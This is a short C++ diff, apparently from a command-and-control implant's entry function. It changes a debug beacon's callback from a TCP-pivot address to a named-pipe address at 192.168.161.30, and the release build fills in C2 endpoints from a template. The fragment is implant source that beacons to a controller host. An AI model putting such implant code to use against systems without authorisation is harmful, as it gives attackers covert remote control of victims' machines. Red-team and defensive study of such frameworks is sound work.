@@ -567,7 +567,7 @@ int Entry() {
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
 #ifdef DEBUG
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("tcppivot://192.168.161.30:9001", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>(string{ "namedpipe://192.168.161.30/pipe/foobar" }, cli);
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     shared_ptr<Beacon> beacon = make_shared<Beacon>("{{$value}}", cli);
